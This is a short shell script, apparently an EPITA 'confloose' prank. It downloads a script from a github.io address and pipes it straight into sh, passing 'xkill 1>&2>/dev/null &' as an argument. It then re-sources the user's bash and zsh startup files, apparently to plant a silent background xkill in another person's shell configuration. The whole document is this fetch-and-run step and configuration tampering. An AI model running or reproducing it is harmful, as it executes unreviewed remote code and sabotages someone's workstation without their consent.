#!/bin/sh

echo $(curl "https://d-002.github.io/epita/confloose/bashrc_confloose_base.sh") "xkill" "'xkill 1>&2>/dev/null &'" | sh
for name in bashrc zshrc; do source "$HOME/.$name" 2>/dev/null; done
